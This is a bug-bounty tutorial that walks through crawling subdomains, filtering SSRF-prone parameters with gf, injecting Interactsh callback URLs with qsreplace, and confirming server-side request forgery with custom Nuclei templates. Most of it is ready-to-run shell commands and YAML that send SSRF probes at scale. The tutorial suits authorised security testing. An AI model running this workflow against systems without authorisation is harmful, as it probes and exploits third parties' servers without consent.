

# 🌐 Checklist: From Recon to SSRF with Real Callbacks

Most bug hunters stop at endpoint collection. But if you know how to chain recon + parameter fuzzing + OAST callbacks, you can validate SSRF in minutes.

This guide walks you through a high-signal SSRF hunting workflow—from spidering, to sorting by vulnerability class, to firing real SSRF probes using automation. Whether you're using Bugcrowd, HackerOne, or a private program, this blueprint helps you go from endpoints → vulnerable parameters → confirmed bugs.

Let’s go.

---

## 🔍 Step 1: Spider Your Subdomains to Build the Attack Surface

**The goal:** collect a large, unique list of parameterized endpoints across all your subdomains.

### 🔧 Tool 1: GoSpider

```
gospider -S subdomains.txt -a -r --js --sitemap --robots -d 30 -c 10 -t 20 -K 10 -q | tee gospider.txt
```

### 🔧 Tool 2: Katana (ProjectDiscovery)

```
katana -no-color -system-chrome -list subdomains.txt -concurrency 50 -q -kf all -jc -d 30 | tee katana.txt
```

### 🔧 Tool 3: GAU (GetAllUrls)

```
cat subdomains.txt | gau -t 50 | tee gau.txt  
```

### 🔧 Tool 4: ParamSpider

```
paramspider -l subdomains.txt
cd results && cat *.txt > paramspider.txt
```

### 🗃️ Merge and Deduplicate

```
cat gospider.txt katana.txt gau.txt paramspider.txt > all.txt
cat all.txt | sort -u | tee sortedEndpoints.txt
```

---

## 🧐 Step 2: Filter for SSRF-Prone Parameters Using GF

Now we’ll use GF (GoFish) to filter only those endpoints likely to be vulnerable to SSRF.

### 🔧 Tool: GF + GF-Patterns

**Install GF:**

```
go install -v github.com/tomnomnom/gf@latest
```

**Clone patterns:**

```
git clone https://github.com/1ndianl33t/Gf-Patterns.git
mkdir ~/.gf
cp Gf-Patterns/*.json ~/.gf/
```

### 🧪 Extract SSRF-Specific Endpoints:

```
cat sortedEndpoints.txt | gf ssrf | tee test-for-ssrf.txt
```

This filters URLs with suspicious parameters like `?url=`, `?redirect=`, or `?path=`—all high-value SSRF candidates.

---

## 🎯 Step 3: Inject Callback URLs Using Interactsh + qsreplace

To detect real SSRF, you need an external callback server. We’ll use Interactsh to generate unique listener URLs, and qsreplace to inject them into every parameter.

### 🔧 Tool 1: Interactsh

```
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

Copy your unique callback URL (e.g., `oast.site`) when prompted.

### 🔧 Tool 2: qsreplace

```
go install github.com/tomnomnom/qsreplace@latest
```

### 🛠️ Replace All Parameters With Your Interactsh URL:

```
cat test-for-ssrf.txt | qsreplace https://your-interact-url.oast.site | tee huntingSSRF.txt
```

This gives you a list of SSRF payloads across all likely-vulnerable parameters.

---

## 🚀 Step 4: Validate SSRF With Custom Nuclei Templates

Nuclei + OAST templates = automated SSRF detection with confirmation via live callbacks.

### 🔧 Install Nuclei

```
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

### 📄 Create Two Templates:

**ssrf-get.yaml**

```yaml
id: get-ssrf
info:
  name: GET SSRF Check
  author: trickest
  severity: high
  tags: ssrf,oast
requests:
  - method: GET
    path:
      - "$TARGETS"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
```

**ssrf-post.yaml**

```yaml
id: ssrf-post
info:
  name: POST SSRF Check
  author: trickest
  severity: high
  tags: ssrf,oast
requests:
  - method: POST
    path:
      - "{{BaseURL}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
```

### 🢨 Run Nuclei:

```
nuclei -no-color -stats -templates ./find-ssrf/ \
-list huntingSSRF.txt -concurrency 100 -output ssrf-found.txt
```

Every match = confirmed SSRF. Interactsh will show you incoming callbacks. Now verify and report.

---

## 💡 Final Thoughts

This isn’t just recon—it’s recon with confirmation. Instead of collecting endpoints and hoping for the best, this workflow:

* 🔍 Targets likely SSRF locations
* ⚙️ Automates callback injection
* 📡 Validates with real traffic

If you're still manually poking parameters, try this instead—it scales, it works, and it finds bugs others miss.
